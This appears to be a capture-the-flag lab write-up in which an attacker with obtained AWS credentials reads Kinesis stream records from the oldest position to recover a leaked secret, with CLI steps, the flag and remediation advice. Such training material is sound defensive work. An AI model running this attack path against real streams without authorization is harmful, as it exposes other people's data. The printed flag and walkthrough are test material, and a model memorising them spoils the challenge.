# Kinesis Shard Reader — Sensitive Data in Stream Records

**Provider**: AWS  
**Difficulty**: Intermediate  
**MITRE ATT&CK**: [T1530 — Data from Cloud Storage Object](https://attack.mitre.org/techniques/T1530/)

## Scenario

You have obtained AWS credentials for an IAM user with Kinesis read permissions. A developer accidentally published a sensitive value as a record into a Kinesis Data Stream. Records are retained for 24 hours. Reading the shard from the beginning reveals the flag.

## Objective

Read the Kinesis Data Stream records and decode the flag.

## Permissions

The attacker IAM user has the following permissions:

- `kinesis:ListStreams`
- `kinesis:DescribeStream`
- `kinesis:DescribeStreamSummary`
- `kinesis:GetShardIterator`
- `kinesis:GetRecords`
- `kinesis:ListShards`

## Attack Path

1. Configure AWS CLI with the provided credentials.
2. List Kinesis streams:
   ```bash
   aws kinesis list-streams
   ```
3. List shards in the stream:
   ```bash
   aws kinesis list-shards --stream-name <stream-name>
   ```
4. Get a shard iterator starting from the oldest record:
   ```bash
   aws kinesis get-shard-iterator \
     --stream-name <stream-name> \
     --shard-id shardId-000000000000 \
     --shard-iterator-type TRIM_HORIZON
   ```
5. Read records using the iterator:
   ```bash
   aws kinesis get-records --shard-iterator <iterator>
   ```
6. Decode the base64-encoded `Data` field:
   ```bash
   echo "<base64-data>" | base64 -d
   ```

## Flag

`CUMULONIMBUS{K1n3s1s_Sh4rd_R3c0rd_L34k}`

## Remediation

- Never publish secrets or sensitive data as Kinesis stream records.
- Apply fine-grained IAM policies restricting `kinesis:GetRecords` to specific stream ARNs and legitimate consumer roles only.
- Enable server-side encryption on Kinesis Data Streams using KMS.
- Monitor `GetRecords` calls via CloudTrail and alert on unexpected consumers accessing production streams.
